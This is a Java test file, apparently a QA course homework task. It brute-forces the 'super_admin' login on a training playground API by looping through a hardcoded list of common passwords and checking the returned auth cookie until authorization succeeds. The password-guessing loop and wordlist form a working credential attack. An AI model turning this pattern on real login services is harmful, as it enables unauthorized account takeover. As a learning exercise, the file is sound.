import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;
import java.util.HashMap;
import java.util.Map;

public class PasswordSelectionTest {
    @Test
    public void PasswordSelection() {
        String[] passwords = {"password", "123456", "12345678", "qwerty", "abc123", "monkey", "1234567",
                "letmein", "trustno1", "dragon", "baseball", "111111", "iloveyou", "master", "sunshine",
                "ashley", "bailey", "passw0rd", "shadow", "123123", "654321", "superman", "qazwsx",
                "michael", "football", "Football", "welcome", "jesus", "ninja", "mustang", "password1", "123456789",
                "adobe123", "admin", "1234567890", "photoshop", "1234", "12345", "princess", "azerty",
                "000000", "access", "696969", "batman", "1qaz2wsx", "qwertyuiop", "solo", "starwars", "login",
                "121212", "flower", "hottie", "loveme", "zaq1zaq1", "freedom", "whatever", "666666", "654321",
                "!@#$%^&", "charlie", "aa123456", "donald", "qwerty123", "1q2w3e4r", "qwertyuiop", "555555",
                "7777777", "888888", "123qwe"};

        Map<String, String> data = new HashMap<>();
        data.put("login", "super_admin");

        String responseBody;
        for (String password : passwords) {
            data.put("password", password);

            Response responseForGet = RestAssured
                    .given()
                    .body(data)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();

            String responseCookie = responseForGet.getCookie("auth_cookie");
            Map<String, String> cookies = new HashMap<>();
            cookies.put("auth_cookie", responseCookie);

            Response responseForCheck = RestAssured
                    .given()
                    .body(data)
                    .cookies(cookies)
                    .when()
                    .post("https://playground.learnqa.ru/api/check_auth_cookie")
                    .andReturn();

            responseBody = responseForCheck.getBody().asString();

            if (responseBody.equals("You are authorized")) {
                System.out.println("Your password is:");
                System.out.println(password);
                break;
            }
        }
    }
}